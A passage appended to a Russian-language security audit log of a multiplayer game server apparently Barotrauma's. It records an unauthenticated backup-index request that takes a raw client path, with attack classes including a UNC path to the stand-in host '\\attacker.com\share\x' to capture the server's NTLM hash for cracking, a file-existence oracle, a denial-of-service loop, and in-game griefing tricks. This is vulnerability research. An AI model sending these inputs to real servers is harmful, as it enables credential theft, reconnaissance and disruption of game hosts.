@@ -22565,3 +22565,63 @@ Update ставит только свой статус (SessionId match) — п�
 
 ## НЕ-НАХОДКИ: голос-спуф VoIP с чужим SessionId — нет (id match); мьют
 серверный чекает; Update readycheck — только свой статус.
+
+== ВОЛНА 640 — РЕАЛЬНЫЕ ЭКСПЛОЙТЫ: REQUEST_BACKUP_INDICES + аудит entity-событий ==
+
+## ★★★ REQUEST_BACKUP_INDICES — ПУТЬ ОТ КЛИЕНТА БЕЗ ВСЯКИХ ПРОВЕРОК
+GameServer.cs:1042-1049:
+  case REQUEST_BACKUP_INDICES: SendBackupIndices(inc, connectedClient);
+  БЕЗ перм-гейта, БЕЗ rate limit. Внутри:
+  string savePath = inc.ReadString();   // СЫРАЯ СТРОКА ОТ КЛИЕНТА
+  var indexData = SaveUtil.GetIndexData(savePath);
+  → GetIndexData(fullPath): path=GetDirectoryName(fullPath), base=GetFileNameWithoutExtension
+  → Directory.GetFiles(path, ".{base}.save.bk*", IgnoreInaccessible=true)
+  → для КАЖДОГО совпадения: DecompressFileToStream + байтовый парсер XML-рута
+  → клиенту ОТВАРИВАЕТСЯ: NetCollection<BackupIndexData>{ Index,
+    LocationNameIdentifier (currentlocation!), LocationType, LevelType, SaveTime }
+
+## КЛАССЫ АТАК (реальные):
+1. ★ NTLM-HASH CAPTURE на Windows-серверах: savePath = "\\attacker.com\share\x"
+   → Windows SMB-клиент сервера идёт на УДАЛЁННЫЙ хост и шлёт NTLMv2-челлендж
+   АККАУНТА СЕРВЕРА → офлайн-крак hashcat'ом. Классика path-based hash leak.
+   Никаких прав, один reliable-пакет со строкой.
+2. ОРАКУЛ ДИРЕКТОРИЙ/ФАЙЛОВ: ответ отличим для существующих vs нет (пустой список,
+   ошибки в лог). Перебор стандартных путей сейвов:
+   %LocalAppData%\Daedalic Entertainment GmbH\Barotrauma\... → если хост играл
+   в кампании на этой машине — клиент узнаёт ИМЕНА ЛОКАЦИЙ кампаний + таймстампы
+   сейвов = разведка прогресса/географии хозяина БЕЗ прав.
+3. DoS: путь в огромную директорию → полная её эмуляция (GetFiles) + полный
+   decompress КАЖДОГО совпавшего .save.bk (архив!) ради одного тега.
+   Циклишь пакетом = CPU/IO-бомба на диске сервера.
+4. XXE/чтение произвольных файлов НЕТ: парсер байтовый (только корневой тег),
+   файлы должны совпасть с паттерном .{base}.save.bk* и распаковаться.
+
+## АУДИТ КЛИЕНТСКИХ ENTITY-СОБЫТИЙ (ServerEntityEventManager.Read 475-548):
+Формат: padBits + u16 firstEventID + byte count + [{u16 entityID, u32 len,
+  u16 characterStateID, len-2 байт payload}]. Буфер 512, дроп 256.
+RequireCharacter = entity is not Hull (хуллы без чара — для спектатинга).
+ReadEvent → entity.ServerEventRead(buffer, sender) для ЛЮБОГО entityID из пакета.
+
+ПРОВЕРЕНО (все за гейтами):
+- Character.ServerEventRead (CharacterNetworking.cs:269): InventoryState →
+  Inventory.ServerEventRead: ГЕЙТ sender.Character.CanAccessInventory(this,
+  AllowFriendly drag-drop) — ЧУЖОЙ ИНВЕНТАРЬ ЗАКРЫТ ✓; Treatment/Status (give in =
+  самоубийство при incapacitated) — только свой чар ✓; ConfirmTalentRefund/
+  UpdateTalents — CanManageTalents ✓ (база TalentOverspend 600-603).
+- Hull.ServerEventRead (Hull.cs серверный 127): Status (вода/огонь) → ГЕЙТ
+  ConsoleCommands + разрешённая команда fire/editfire ✓ (обычному клиенту
+  залить чужой отсек НЕЛЬЗЯ); BackgroundSections (покраска) → AllowInput +
+  Sprayer в руках + краска в контейнере + дистанция Range*1.1 + знак изменения
+  цвета ✓; Decal → только BaseAlpha существующего декала при спрее ✓.
+  BallastFlora от клиента → throw → ловится в Update (try/catch) — не крашит.
+- Deconstructor: CanClientAccess ✓. Sonar: CanClientAccess (пинг-спам только
+  на своей сабе; без rate limit — CreateServerEvent броадкаст на каждый пакет) ~.
+- CustomInterface: CanClientAccess/owner ✓. DockingPort: ManageMap ✓.
+- Item.ServerEventRead + компоненты: покрыты ранее (632/617/627).
+
+## МЕЛКИЕ ФАН 640:
+- Декал-стирание: с компрессорной краской (A=0) в руках — стирать КРОВЬ/ГАРЬ
+  на чужих стенах (CanClientAccess к хуллу = своя саба; на чужой — только
+  если можно открыть панели).
+- Сонар-пинг-спам на своей сабе: Active Mode без лимита = приманка монстров
+  к себе + аудио-спам экипажу. Саба твоя — монстры общие. Троллинг экипажа.
